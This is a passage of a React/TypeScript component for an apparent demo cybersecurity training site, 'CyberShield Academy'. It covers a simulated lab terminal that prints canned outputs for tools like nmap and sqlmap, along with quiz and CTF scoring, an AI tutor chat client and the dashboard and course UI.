  const [labOutput, setLabOutput] = useState<string[]>(['\\x1b[32m  ╔═══════════════════════════════════════════════════════╗\\x1b[0m','\\x1b[32m  ║     CyberShield Academy - Secure Lab Environment       ║\\x1b[0m','\\x1b[32m  ╚═══════════════════════════════════════════════════════╝\\x1b[0m','','  Type \\'help\\' for commands, \\'status\\' for objectives.','']);
  const [labInput, setLabInput] = useState('');
  const [labActive, setLabActive] = useState(false);
  const [selectedLab, setSelectedLab] = useState<LabScenario|null>(null);
  const [labObjectives, setLabObjectives] = useState<{id:string;description:string;completed:boolean}[]>([]);
  const [labShowScenarios, setLabShowScenarios] = useState(true);
  const labEndRef = useRef<HTMLDivElement>(null);
  const [courseFilter, setCourseFilter] = useState('all');
  const [selectedCourse, setSelectedCourse] = useState<CourseData|null>(null);
  const [ctfFilter, setCtfFilter] = useState('all');
  const [ctfDifficulty, setCtfDifficulty] = useState('all');
  const [ctfFlag, setCtfFlag] = useState('');
  const [ctfResult, setCtfResult] = useState<{correct:boolean;message:string;points:number}|null>(null);
  const [ctfChallenges, setCtfChallenges] = useState(DEMO_CTF);
  const [selectedCtf, setSelectedCtf] = useState<CtfChallenge|null>(null);
  const [ctfHintUsed, setCtfHintUsed] = useState(false);
  const [focusScore, setFocusScore] = useState(87);
  const [notifOpen, setNotifOpen] = useState(false);
  const notifications = [
    { id:'n1', title:'New CTF Challenge', message:'Heap Overflow and ROP Chain are now live!', time:'2m ago', read:false },
    { id:'n2', title:'Quiz Score', message:'You scored 90% on Network Fundamentals!', time:'1h ago', read:false },
    { id:'n3', title:'Badge Earned', message:'You earned the Quiz Master badge!', time:'3h ago', read:true },
    { id:'n4', title:'New Lab Available', message:'Reverse Engineering lab is now available!', time:'5h ago', read:true },
    { id:'n5', title:'Streak Bonus', message:'7-day streak! +550 XP bonus earned!', time:'1d ago', read:true },
    { id:'n6', title:'Leaderboard Update', message:'You moved up to rank #8 on the leaderboard!', time:'2d ago', read:true },
  ];
  const currentLevel = user.level;
  const currentXp = user.xp;
  const xpForNext = LEVEL_XP[Math.min(currentLevel, LEVEL_XP.length-1)] || LEVEL_XP[LEVEL_XP.length-1];
  const xpForPrev = LEVEL_XP[Math.min(currentLevel-1, LEVEL_XP.length-1)] || 0;
  const xpProgress = ((currentXp-xpForPrev)/(xpForNext-xpForPrev))*100;
  const userRank = DEMO_LEADERBOARD.findIndex(e => e.id==='l8') + 1;

  useEffect(() => { chatEndRef.current?.scrollIntoView({behavior:'smooth'}); }, [messages, isTyping]);
  useEffect(() => { labEndRef.current?.scrollIntoView({behavior:'smooth'}); }, [labOutput]);
  useEffect(() => {
    if (!quizCourse || quizSubmitted) return;
    quizTimerRef.current = setInterval(() => { setQuizTimeLeft(p => { if(p<=1){clearInterval(quizTimerRef.current!);return 0;} return p-1; }); }, 1000);
    return () => { if(quizTimerRef.current) clearInterval(quizTimerRef.current); };
  }, [quizCourse, quizSubmitted]);
  useEffect(() => {
    if(!isAuthenticated) return;
    let focusStart = Date.now();
    const onFocus = () => { focusStart = Date.now(); setFocusScore(s=>Math.min(100,s+2)); };
    const onBlur = () => { if(Date.now()-focusStart>5000) setFocusScore(s=>Math.max(0,s-5)); };
    window.addEventListener('focus',onFocus); window.addEventListener('blur',onBlur);
    return () => { window.removeEventListener('focus',onFocus); window.removeEventListener('blur',onBlur); };
  }, [isAuthenticated]);

  const handleLogin = () => {
    if(!loginEmail||!loginPassword){setLoginError('Please fill in all fields');return;}
    if(loginMode==='signup'&&!loginName){setLoginError('Please enter your name');return;}
    setLoginError(''); setIsAuthenticated(true); setShowLogin(false);
    setUser(loginMode==='signup'?{...DEMO_USER,name:loginName,email:loginEmail}:DEMO_USER);
  };
  const handleLogout = () => { setIsAuthenticated(false); setShowLogin(true); setActiveTab('dashboard'); setMessages([WELCOME_MSG]); setSelectedLab(null); setLabShowScenarios(true); setLabActive(false); };

  const sendMessage = async (text?:string) => {
    const msg = text||inputMsg; if(!msg.trim()) return;
    setMessages(p=>[...p,{id:\`u-\${Date.now()}\`,role:'user',content:msg,timestamp:new Date().toISOString()}]);
    setInputMsg(''); setIsTyping(true);
    try {
      const res = await fetch('/api/chat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:user.id,sessionId:SESSION_ID,message:msg,history:messages.slice(-10).map(m=>({role:m.role,content:m.content}))})});
      if(!res.ok) throw new Error('Failed');
      const reader = res.body?.getReader(); const decoder = new TextDecoder(); let fullText = '';
      if(reader){const aiMsg={id:\`a-\${Date.now()}\`,role:'assistant',content:'',timestamp:new Date().toISOString()};setMessages(p=>[...p,aiMsg]);
        while(true){const{done,value}=await reader.read();if(done)break;fullText+=decoder.decode(value,{stream:true});setMessages(p=>p.map(m=>m.id===aiMsg.id?{...m,content:fullText}:m));}}
      if(voiceEnabled&&fullText) speakText(fullText);
    } catch { setMessages(p=>[...p,{id:\`e-\${Date.now()}\`,role:'assistant',content:"I\\'m having connectivity issues. Please try again.",timestamp:new Date().toISOString()}]); }
    setIsTyping(false);
  };

  const speakText = async (text:string) => {
    try { const clean=text.replace(/[#*\`~>\\[\\]()]/g,'').slice(0,1000); const res=await fetch('/api/voice/tts',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:clean,voice:'jam',speed:1.0})});
    if(!res.ok)return; const blob=await res.blob(); const url=URL.createObjectURL(blob); const audio=new Audio(url); currentAudioRef.current=audio; setIsSpeaking(true); audio.onended=()=>{setIsSpeaking(false);URL.revokeObjectURL(url);}; audio.play(); } catch{}
  };
  const stopSpeaking = () => { currentAudioRef.current?.pause(); currentAudioRef.current=null; setIsSpeaking(false); };
  const toggleRecording = async () => {
    if(isRecording){mediaRecorderRef.current?.stop();setIsRecording(false);return;}
    try{const stream=await navigator.mediaDevices.getUserMedia({audio:true});const mr=new MediaRecorder(stream);audioChunksRef.current=[];
    mr.ondataavailable=e=>{if(e.data.size>0)audioChunksRef.current.push(e.data);};
    mr.onstop=async()=>{stream.getTracks().forEach(t=>t.stop());const blob=new Blob(audioChunksRef.current,{type:'audio/webm'});const fd=new FormData();fd.append('audio',blob,'recording.webm');
    try{const res=await fetch('/api/voice/asr',{method:'POST',body:fd});const data=await res.json();if(data.success&&data.text)sendMessage(data.text);}catch{}};
    mediaRecorderRef.current=mr;mr.start();setIsRecording(true);}catch{}
  };

  const handleLabCommand = (cmd:string) => {
    const newOutput=[...labOutput,\`\\x1b[32mstudent@cybershield\\x1b[0m:\\x1b[34m~\\x1b[0m$ \${cmd}\`];
    let response:string[]=[]; const c=cmd.trim().toLowerCase();
    if(c==='help') response=['Available commands:','  ls, cd, cat, pwd, whoami, id, echo, clear, history','  nmap <target>, curl <url>, dig <domain>','  hashcat <hash>, john, sqlmap <url>, nikto <url>','  gobuster, hydra, openssl, iptables','  file, strings, objdump, gdb, exiftool, binwalk','  ping, ifconfig, netstat, traceroute','  python3, bash, gcc','  ps aux, top, find, grep, head, tail, wc, tree','  status - show lab objectives','','  Type "help" for all available commands.'];
    else if(c==='clear'){setLabOutput([]);setLabInput('');return;}
    else if(c==='whoami') response=['student'];
    else if(c==='id') response=['uid=1000(student) gid=1000(student) groups=1000(student),27(sudo),33(www-data)'];
    else if(c==='pwd') response=['/home/student'];
    else if(c==='ls') response=['drwxr-xr-x  targets/  vulnerable_webapp/  exercises/  tools/  captures/','-rw-r--r--  notes.txt','-rwx------  exploit.py'];
    else if(c==='tree') response=['/home/student','├── targets/','│   ├── vulnerable_app','│   ├── docker-compose.yml','│   └── config.yaml','├── exercises/','│   ├── task1.sh','│   ├── task2.py','│   ├── challenge.c','│   └── readme.md','├── tools/','│   ├── scanner.py','│   └── cracker.py','├── captures/','│   ├── network_capture.pcap','│   └── memory_dump.raw','└── notes.txt'];
    else if(c.startsWith('cd')){if(!c.split(' ')[1]||c.includes('~'))return;setLabOutput(p=>[...newOutput,'Changed directory.']);setLabInput('');return;}
    else if(c.startsWith('cat notes')) response=['Cybersecurity Lab Notes','=========================','Session 1: Network Reconnaissance','Session 2: Web App Security - XSS, SQLi, CSRF','Session 3: Privilege Escalation Techniques','TODO: Complete buffer overflow lab'];
    else if(c.startsWith('cat')) response=[c.includes('password')?'admin:$2b$12$LJ3m4ys3Lk...':\`cat: \${c.split(' ')[1]||'?'}: No such file or directory\`];
    else if(c==='ifconfig'||c==='ip a') response=['eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500','        inet 172.17.0.3  netmask 255.255.0.0  broadcast 172.17.255.255','        ether 02:42:ac:11:00:03  txqueuelen 0','lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536','        inet 127.0.0.1  netmask 255.0.0.0'];
    else if(c.startsWith('nmap')){response=[\`Starting Nmap 7.94 at \${new Date().toISOString()}\`,\`Nmap scan report for \${c.split(' ')[1]||'192.168.1.10'}\`,'Host is up (0.0034s latency).','PORT     STATE SERVICE       VERSION','22/tcp   open  ssh           OpenSSH 8.9p1','80/tcp   open  http          Apache/2.4.54','443/tcp  open  ssl/https     Apache/2.4.54','3306/tcp open  mysql         MySQL 8.0.32','8080/tcp open  http-proxy    nginx/1.23.3','','Nmap done: 1 IP address (1 host up) scanned in 3.47 seconds'];checkLabObjective(c);}
    else if(c.startsWith('hashcat')||c.startsWith('john')){response=['hashcat (v6.2.6) starting...','Hashes: 1 digest; 1 unique digests','','5e884898...:password','','Status: Cracked','Hash.Mode: 1400 (SHA2-256)','','1 recovered from 1 input hashes'];checkLabObjective(c);}
    else if(c.startsWith('sqlmap')){response=['[*] starting @ '+new Date().toISOString(),'[INFO] testing connection to the target URL','[INFO] parameter appears to be injectable','back-end DBMS: MySQL >= 5.6','[INFO] fetching database names','available databases [3]:','[*] information_schema','[*] app_db','[*] secrets'];checkLabObjective(c);}
    else if(c.startsWith('nikto')){response=['- Nikto v2.5.0','+ Target IP: 192.168.1.10','+ Server: Apache/2.4.52 (Ubuntu)','+ /: X-Content-Type-Options header missing','+ /admin/: Directory indexing found','+ /phpinfo.php: PHP info exposed','+ /backups/: Directory indexing found','+ 6 items found'];checkLabObjective(c);}
    else if(c.startsWith('curl')){response=['HTTP/1.1 200 OK','Content-Type: text/html','<h1>Welcome to Target Corp Internal Portal</h1>','<p>Server: Apache/2.4.52 (Ubuntu)</p>','<p>Powered by PHP 8.1.2</p>'];checkLabObjective(c);}
    else if(c.startsWith('openssl')){response=['OpenSSL 3.0.2 15 Mar 2022','e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'];checkLabObjective(c);}
    else if(c.startsWith('iptables -l')||c.startsWith('iptables -L')){response=['Chain INPUT (policy DROP)','target     prot opt source       destination','ACCEPT     tcp  --  0.0.0.0/0    0.0.0.0/0    tcp dpt:22','ACCEPT     tcp  --  0.0.0.0/0    0.0.0.0/0    tcp dpt:80','ACCEPT     tcp  --  0.0.0.0/0    0.0.0.0/0    tcp dpt:443','DROP       all  --  0.0.0.0/0    0.0.0.0/0    ctstate INVALID','','Chain FORWARD (policy DROP)','Chain OUTPUT (policy ACCEPT)'];checkLabObjective(c);}
    else if(c.startsWith('file ')) response=[\`\${c.split(' ')[1]}: \${c.includes('.py')?'Python script, ASCII text':c.includes('.c')?'C source, ASCII text':c.includes('.pcap')?'pcap capture file':'data'}\`];
    else if(c.startsWith('strings ')) response=['/lib/x86_64-linux-gnu/libc.so.6','__libc_start_main','GLIBC_2.34','flag.txt','CYBERSHIELD{'];
    else if(c.startsWith('objdump ')) response=[\`\${c.split(' ')[1]}:     file format elf64-x86-64\`,'Disassembly of section .text:','0000000000001149 <main>:','    1149:    f3 0f 1e fa     endbr64','    114d:    55           push   rbp','    114e:  48 89 e5      mov    rbp,rsp'];
    else if(c.startsWith('gdb ')) response=['GNU gdb (Ubuntu 12.1)','Reading symbols...','(gdb) disassemble main','Dump of assembler code for function main:','   0x1149 <+0>: endbr64','   0x114d <+4>: push   rbp','   0x1151 <+8>: lea    rdi,0x2004','   0x1158 <+15>: call   0x10f0 <gets@plt>','End of assembler dump.'];
    else if(c.startsWith('exiftool')) response=['ExifTool Version: 12.50','File Size: 245 kB','MIME Type: image/jpeg','Image Width: 1920','Image Height: 1080','GPS Latitude: 40 deg 42\\' 44.28" N','GPS Longitude: 74 deg 0\\' 21.72" W','Author: shadow_h4cker'];checkLabObjective(c);}
    else if(c.startsWith('binwalk')) response=['DECIMAL   HEXADECIMAL   DESCRIPTION','0         0x0           JPEG image data, JFIF','3021      0xBCD         Zip archive data','15840     0x3DF0        ELF, 64-bit LSB shared object','28672     0x7000        PNG image, 800x600','45056     0xB000        SQLite format 3 database','N.B.: Embedded files found!'];checkLabObjective(c);}
    else if(c.startsWith('ping ')) response=[\`PING \${c.split(' ')[1]}: 56 bytes\\n64 bytes: icmp_seq=1 ttl=118 time=\${(Math.random()*20+5).toFixed(1)} ms\\n64 bytes: icmp_seq=2 ttl=118 time=\${(Math.random()*20+5).toFixed(1)} ms\\n3 packets transmitted, 3 received, 0% loss\`];
    else if(c.startsWith('ps ')) response=['USER    PID %CPU %MEM  COMMAND','root      1  0.0  0.1  /sbin/init','root     42  0.0  0.1  /usr/sbin/sshd','student 100  0.0  0.2  -bash','www-data 200 0.1  0.3  nginx','mysql   300  0.5  2.1  /usr/sbin/mysqld'];
    else if(c==='status'){const comp=labObjectives.filter(o=>o.completed).length;const total=labObjectives.length;response=[\`=== Lab Objectives: \${comp}/\${total} (\${Math.round(comp/Math.max(total,1)*100)}%) ===\`,...labObjectives.map(o=>\`  \${o.completed?'[x]':'[ ]'} \${o.description}\`)];}
    else if(c==='') response=[];
    else response=[\`bash: \${cmd.split(' ')[0]}: command not found. Type 'help' for available commands.\`];
    setLabOutput(p=>[...newOutput,...response.map(l=>l||''), '']); setLabInput('');
  };

  const checkLabObjective = (cmd:string) => {
    setLabObjectives(prev => prev.map(o => {
      if(o.completed) return o;
      const pattern = new RegExp(o.verificationPattern, 'i');
      if(pattern.test(cmd)) return {...o, completed:true};
      return o;
    }));
  };

  const startLab = (lab:LabScenario) => {
    setSelectedLab(lab);
    setLabObjectives(lab.objectives.map(o=>({...o,completed:false})));
    setLabOutput(['\\x1b[36m═══════════════════════════════════════════════════\\x1b[0m', \`\\x1b[1;33m  Lab: \${lab.title}\\x1b[0m\`, \`\\x1b[2m  Difficulty: \${lab.difficulty} | Duration: \${lab.duration}\\x1b[0m\`, '', ...lab.steps.map((s,i)=>\`  \\x1b[33mStep \${i+1}:\\x1b[0m \${s}\`), '', '  Type \\x1b[1m\\'help\\'\\x1b[0m for commands, \\x1b[1m\\'status\\'\\x1b[0m for objectives.', '']);
    setLabActive(true); setLabShowScenarios(false);
  };

  const startQuiz = (courseId:string) => { const qs=DEMO_QUIZZES[courseId]; if(!qs)return; setQuizCourse(courseId); setQuizQuestions(qs); setQuizIndex(0); setQuizAnswers({}); setQuizSubmitted(false); setQuizScore(0); setQuizTimeLeft(300); };
  const submitQuiz = () => { if(!quizCourse)return; let score=0; quizQuestions.forEach(q=>{if(quizAnswers[q.id]===q.correctIndex)score+=Math.round(100/quizQuestions.length);}); setQuizScore(score); setQuizSubmitted(true); if(quizTimerRef.current)clearInterval(quizTimerRef.current); };

  const submitCtfFlag = (challengeId:string) => {
    const challenge=ctfChallenges.find(c=>c.id===challengeId); if(!challenge||!ctfFlag.trim())return;
    const isCorrect=ctfFlag.trim()===challenge.flag;
    if(isCorrect){setCtfChallenges(p=>p.map(c=>c.id===challengeId?{...c,solved:true,solveCount:c.solveCount+1}:c));setUser(u=>({...u,xp:u.xp+challenge.points}));}
    setCtfResult({correct:isCorrect,message:isCorrect?\`Correct! +\${challenge.points} XP\`:'Incorrect flag. Try again!',points:isCorrect?challenge.points:0});
    setCtfFlag(''); setTimeout(()=>setCtfResult(null),4000);
  };

  const filteredCourses = courseFilter==='all'?DEMO_COURSES:DEMO_COURSES.filter(c=>c.category===courseFilter);
  const filteredCtf = ctfChallenges.filter(c=>(ctfFilter==='all'||c.category===ctfFilter)&&(ctfDifficulty==='all'||c.difficulty===ctfDifficulty));
  const totalCtfPoints = ctfChallenges.reduce((s,c)=>s+c.points,0);
  const solvedCtfPoints = ctfChallenges.filter(c=>c.solved).reduce((s,c)=>s+c.points,0);
  const completedObjCount = labObjectives.filter(o=>o.completed).length;

  // ─── RENDER ────────────────────────────────────────────────────────────

  if(!isAuthenticated) return (
    <div className="min-h-screen flex items-center justify-center p-4"><Particles/>
      <motion.div initial={{opacity:0,y:40}} animate={{opacity:1,y:0}} transition={{duration:0.8}}>
        <div className="login-card w-full max-w-md p-8">
          <div className="flex justify-center mb-6"><div className="holo-shield p-4 rounded-2xl"><Shield className="w-12 h-12 neon-text" /></div></div>
          <h1 className="text-3xl font-bold text-center mb-2"><span className="text-gradient-holo">CyberShield</span> Academy</h1>
          <p className="text-center text-sm text-[#64748b] mb-8">AI-Powered Cybersecurity Learning Platform</p>
          <div className="space-y-4">
            {loginMode==='signup'&&<div><label className="text-xs text-[#64748b] mb-1 block">Full Name</label><input className="holo-input w-full" placeholder="Enter your name" value={loginName} onChange={e=>setLoginName(e.target.value)}/></div>}
            <div><label className="text-xs text-[#64748b] mb-1 block">Email</label><input className="holo-input w-full" type="email" placeholder="you@cybershield.academy" value={loginEmail} onChange={e=>setLoginEmail(e.target.value)}/></div>
            <div><label className="text-xs text-[#64748b] mb-1 block">Password</label><div className="relative"><input className="holo-input w-full pr-10" type={showPassword?'text':'password'} placeholder="Enter password" value={loginPassword} onChange={e=>setLoginPassword(e.target.value)}/><button className="absolute right-3 top-1/2 -translate-y-1/2 text-[#64748b] hover:text-[#00f0ff]" onClick={()=>setShowPassword(!showPassword)}>{showPassword?<EyeOff size={16}/>:<Eye size={16}/>}</button></div></div>
            {loginError&&<p className="text-pink-400 text-sm">{loginError}</p>}
            <button className="holo-btn holo-btn-primary w-full" onClick={handleLogin}>{loginMode==='login'?'Sign In':'Create Account'}</button>
            <p className="text-center text-sm text-[#64748b]">{loginMode==='login'?"Don't have an account?":"Already have an account?"} <button className="neon-text hover:underline" onClick={()=>{setLoginMode(loginMode==='login'?'signup':'login');setLoginError('');}}>{loginMode==='login'?'Sign Up':'Sign In'}</button></p>
            <p className="text-center text-xs text-[#475569]">Demo: alex@cybershield.academy / demo1234</p>
          </div>
        </div>
      </motion.div>
    </div>
  );

  return (<div className="min-h-screen relative"><Particles/>
    {/* Header */}
    <header className="sticky top-0 z-50 glass-panel border-b border-[rgba(0,240,255,0.08)] px-4 py-2">
      <div className="max-w-[1600px] mx-auto flex items-center justify-between">
        <div className="flex items-center gap-3"><div className="holo-shield p-1.5 rounded-lg"><Shield className="w-6 h-6 neon-text"/></div><span className="text-lg font-bold text-gradient-holo hidden sm:block">CyberShield</span></div>
        <nav className="flex items-center gap-1 overflow-x-auto no-scrollbar">{TABS.map(t=>(<button key={t.id} className={\`holo-tab \${activeTab===t.id?'holo-tab-active':''}\`} onClick={()=>setActiveTab(t.id)}><t.icon size={15}/><span className="ml-1.5 hidden md:inline">{t.label}</span></button>))}</nav>
        <div className="flex items-center gap-3">
          <button className="relative p-2 rounded-lg hover:bg-[rgba(0,240,255,0.05)]" onClick={()=>setNotifOpen(!notifOpen)}>{notifications.some(n=>!n.read)&&<span className="notif-dot absolute top-1 right-1"/>}<Bell size={18} className="text-[#64748b]"/></button>
          <div className="flex items-center gap-2 px-3 py-1.5 rounded-xl glass-panel"><Avatar className="w-7 h-7"><AvatarFallback className="bg-[rgba(0,240,255,0.15)] text-xs neon-text">{user.name.split(' ').map(n=>n[0]).join('')}</AvatarFallback></Avatar><span className="text-sm font-medium hidden lg:block">{user.name}</span><button className="text-[#64748b] hover:text-pink-400 ml-1" onClick={handleLogout}><LogOut size={14}/></button></div>
        </div>
      </div>
    </header>

    {/* Notifications Panel */}
    <AnimatePresence>{notifOpen&&<motion.div initial={{opacity:0,x:20}} animate={{opacity:1,x:0}} exit={{opacity:0,x:20}} className="fixed top-14 right-4 z-50 w-80 holo-card p-0" style={{maxHeight:'400px'}}><div className="p-4 border-b border-[rgba(0,240,255,0.08)]"><h3 className="font-semibold flex items-center gap-2"><Bell size={16}/>Notifications</h3></div><ScrollArea className="max-h-[340px]">{notifications.map(n=>(<div key={n.id} className={\`p-3 border-b border-[rgba(30,41,59,0.3)] hover:bg-[rgba(0,240,255,0.03)] \${!n.read?'bg-[rgba(0,240,255,0.02)]':''}\`}><p className="text-sm font-medium">{n.title}</p><p className="text-xs text-[#64748b] mt-0.5">{n.message}</p><p className="text-xs text-[#475569] mt-1">{n.time}</p></div>))}</ScrollArea></motion.div>}</AnimatePresence>

    {/* Main Content */}
    <main className="max-w-[1600px] mx-auto p-4 md:p-6 relative z-10">
      <AnimatePresence mode="wait"><motion.div key={activeTab} initial={{opacity:0,y:10}} animate={{opacity:1,y:0}} exit={{opacity:0,y:-10}} transition={{duration:0.25}}>

        {/* ═══ DASHBOARD ═══ */}
        {activeTab==='dashboard'&&(<div className="space-y-6">
          <div className="flex items-center justify-between"><div><h1 className="text-2xl font-bold">Welcome back, <span className="neon-text">{user.name}</span></h1><p className="text-[#64748b] text-sm mt-1">{LEVEL_TITLES[Math.min(currentLevel-1,LEVEL_TITLES.length-1)]} · Level {currentLevel} · {user.streakDays}-day streak <Flame className="inline w-4 h-4 text-orange-400"/></p></div></div>
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
            {[{icon:Zap,label:'Total XP',value:user.xp.toLocaleString(),color:'#00f0ff'},{icon:Flag,label:'CTF Solved',value:\`\${ctfChallenges.filter(c=>c.solved).length}/\${ctfChallenges.length}\`,color:'#bf00ff'},{icon:Flame,label:'Day Streak',value:user.streakDays,color:'#ff6b35'},{icon:Trophy,label:'Global Rank',value:\`#\${userRank}\`,color:'#ffd700'}].map((s,i)=>(
              <div key={i} className="stat-card-3d p-5" style={{'--stat-color':s.color} as React.CSSProperties} onMouseMove={handleTilt} onMouseLeave={resetTilt}>
                <div className="flex items-center justify-between mb-3"><s.icon size={20} style={{color:s.color}}/><span className="text-xs text-[#64748b]">{s.label}</span></div>
                <p className="text-2xl font-bold counter-up" style={{color:s.color}}>{s.value}</p>
              </div>))}
          </div>
          {/* XP Progress */}
          <div className="holo-card p-5"><div className="flex items-center justify-between mb-2"><span className="text-sm font-medium">Level {currentLevel} → {currentLevel<15?currentLevel+1:'MAX'}</span><span className="text-xs text-[#64748b]">{currentXp.toLocaleString()} / {xpForNext.toLocaleString()} XP</span></div><div className="holo-progress"><div className="holo-progress-bar" style={{width:\`\${Math.min(xpProgress,100)}%\`}}/></div><p className="text-xs text-[#64748b] mt-2">{LEVEL_TITLES[Math.min(currentLevel-1,LEVEL_TITLES.length-1)]} · {(xpForNext-currentXp).toLocaleString()} XP to next level</p></div>
          {/* Quick Stats Row */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="holo-card p-5"><h3 className="font-semibold mb-3 flex items-center gap-2"><TrendingUp size={16} className="neon-text"/>Course Progress</h3><div className="space-y-3">{DEMO_COURSES.filter(c=>c.enrolled).map(c=>(<div key={c.id}><div className="flex justify-between text-sm mb-1"><span>{c.title}</span><span className="text-[#00f0ff]">{c.progress}%</span></div><div className="holo-progress h-1.5"><div className="holo-progress-bar" style={{width:\`\${c.progress||0}%\`}}/></div></div>))}</div></div>
            <div className="holo-card p-5"><h3 className="font-semibold mb-3 flex items-center gap-2"><Activity size={16} className="neon-text-green"/>Recent Activity</h3><div className="space-y-2">{[{icon:CheckCircle2,text:'Completed Network Scanning module',time:'2h ago',color:'#39ff14'},{icon:Flag,text:'Solved SQL Injection 101 (+150 XP)',time:'5h ago',color:'#00f0ff'},{icon:Target,text:'Scored 80% on Cryptography Quiz',time:'1d ago',color:'#bf00ff'},{icon:Flame,text:'7-day streak bonus (+550 XP)',time:'1d ago',color:'#ff6b35'},{icon:GraduationCap,text:'Enrolled in Ethical Hacking course',time:'3d ago',color:'#ffd700'}].map((a,i)=>(<div key={i} className="flex items-start gap-3 p-2 rounded-lg hover:bg-[rgba(0,240,255,0.03)]"><a.icon size={14} className="mt-0.5" style={{color:a.color}}/><div><p className="text-sm">{a.text}</p><p className="text-xs text-[#475569]">{a.time}</p></div></div>))}</div></div>
          </div>
        </div>)}

        {/* ═══ COURSES ═══ */}
        {activeTab==='courses'&&(<div className="space-y-6">
          <div className="flex items-center justify-between flex-wrap gap-3"><h1 className="text-2xl font-bold text-gradient-holo">Course Catalog</h1><div className="flex gap-2 flex-wrap">{NAV_CATEGORIES.map(c=>(<button key={c.id} className={\`holo-badge \${courseFilter===c.id?'holo-badge-cyan':'border-[rgba(100,116,139,0.3)] text-[#64748b]'}\`} onClick={()=>setCourseFilter(c.id)}>{c.label}</button>))}</div></div>
          {!selectedCourse?<div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">{filteredCourses.map(c=>(
            <div key={c.id} className="holo-card holo-card-3d challenge-card p-5 cursor-pointer" onClick={()=>setSelectedCourse(c)} onMouseMove={handleTilt} onMouseLeave={resetTilt}>
              <div className="flex items-center justify-between mb-3"><span className={\`holo-badge holo-badge-\${c.difficulty==='advanced'?'pink':c.difficulty==='intermediate'?'purple':'green'}\`}>{c.difficulty}</span><span className="text-xs text-[#64748b]">{c.durationHours}h</span></div>
              <h3 className="font-semibold mb-2">{c.title}</h3><p className="text-sm text-[#64748b] mb-3 line-clamp-2">{c.description}</p>
              <div className="flex items-center justify-between text-xs text-[#64748b]"><span><Users size={12} className="inline mr-1"/>{c.studentCount.toLocaleString()} students</span><span><BookOpen size={12} className="inline mr-1"/>{c.moduleCount} modules</span></div>
              {c.enrolled&&c.progress!==undefined&&<div className="mt-3"><div className="flex justify-between text-xs mb-1"><span className="text-[#00f0ff]">Enrolled</span><span>{c.progress}%</span></div><div className="holo-progress h-1.5"><div className="holo-progress-bar" style={{width:\`\${c.progress}%\`}}/></div></div>}
            </div>))}</div>:(
            <div><button className="holo-btn holo-btn-sm mb-4" onClick={()=>setSelectedCourse(null)}><ChevronLeft size={14}/>Back to Courses</button>
            <div className="holo-card p-6"><h2 className="text-xl font-bold mb-2">{selectedCourse.title}</h2><p className="text-[#64748b] mb-4">{selectedCourse.description}</p>
            {selectedCourse.modules&&<div className="space-y-2">{selectedCourse.modules.map((m,i)=>(<div key={i} className="flex items-center gap-3 p-3 rounded-lg hover:bg-[rgba(0,240,255,0.03)]">{m.completed?<CheckCircle2 size={18} className="text-green-400"/>:<div className="w-[18px] h-[18px] rounded-full border border-[rgba(100,116,139,0.3)]"/>}<span className={\`text-sm \${m.completed?'text-[#64748b]':''}\`}>{m.title}</span>{m.completed&&<span className="ml-auto holo-badge holo-badge-green text-xs">Done</span>}</div>))}</div>}
            <div className="mt-4 flex gap-3"><button className="holo-btn holo-btn-primary">Continue Learning</button>{selectedCourse.id!=='c1'&&DEMO_QUIZZES[selectedCourse.id]&&<button className="holo-btn" onClick={()=>{setActiveTab('quizzes');startQuiz(selectedCourse.id);}}>Take Quiz</button>}</div></div></div>)}
        </div>)}

        {/* ═══ AI PROFESSOR ═══ */}
        {activeTab==='classroom'&&(<div className="space-y-4" style={{height:'calc(100vh - 140px)'}}>
          <div className="flex items-center gap-3 mb-2"><div className="holo-shield p-1.5 rounded-lg"><Brain className="w-5 h-5 neon-text-purple"/></div><h1 className="text-xl font-bold">AI Professor <span className="text-sm font-normal text-[#64748b]">· Prof. Shield</span></h1></div>
          <div className="holo-card flex-1 flex flex-col overflow-hidden" style={{minHeight:'400px'}}>
            <ScrollArea className="flex-1 p-4 space-y-4">{messages.map(m=>(<div key={m.id} className={\`chat-msg-enter flex gap-3 \${m.role==='user'?'flex-row-reverse':''}\`}><Avatar className="w-8 h-8 shrink-0"><AvatarFallback className={\`text-xs \${m.role==='assistant'?'bg-[rgba(191,0,255,0.15)] neon-text-purple':'bg-[rgba(0,240,255,0.15)] neon-text'}\`}>{m.role==='assistant'?'AI':'ME'}</AvatarFallback></Avatar><div className={\`max-w-[75%] \${m.role==='user'?'text-right':''}\`}><div className={\`inline-block p-3 rounded-2xl text-sm \${m.role==='user'?'bg-[rgba(0,240,255,0.1)] border border-[rgba(0,240,255,0.15)]':'glass-panel border border-[rgba(191,0,255,0.08)]'}\`}><p className="whitespace-pre-wrap">{m.content}</p></div></div></div>))}
            {isTyping&&<div className="flex gap-3"><Avatar className="w-8 h-8"><AvatarFallback className="text-xs bg-[rgba(191,0,255,0.15)] neon-text-purple">AI</AvatarFallback></Avatar><div className="glass-panel p-3 rounded-2xl"><span className="typing-cursor text-sm text-[#64748b]">Thinking</span></div></div>}
            <div ref={chatEndRef}/></ScrollArea>
            <div className="p-3 border-t border-[rgba(0,240,255,0.08)]">
              <div className="flex items-center gap-2">
                <div className="flex-1 relative"><input className="holo-input w-full pr-10" placeholder="Ask about cybersecurity..." value={inputMsg} onChange={e=>setInputMsg(e.target.value)} onKeyDown={e=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendMessage();}}}/><button className="absolute right-2 top-1/2 -translate-y-1/2 text-[#64748b] hover:neon-text" onClick={()=>sendMessage()}><Send size={16}/></button></div>
                <button className={\`p-2.5 rounded-xl transition-all \${isRecording?'bg-[rgba(255,0,110,0.2)] border border-pink-400/30':'border border-[rgba(0,240,255,0.15)] hover:border-[rgba(0,240,255,0.3)]'}\`} onClick={toggleRecording}>{isRecording?<div className="voice-waveform"><span/><span/><span/><span/><span/></div>:<Mic size={18} className={\`\${voiceEnabled?'text-[#64748b]':'text-[#475569]'}\`}/>}</button>
                {isSpeaking&&<button className="p-2.5 rounded-xl border border-[rgba(0,240,255,0.3)]" onClick={stopSpeaking}><Volume2 size={18} className="neon-text"/></button>}
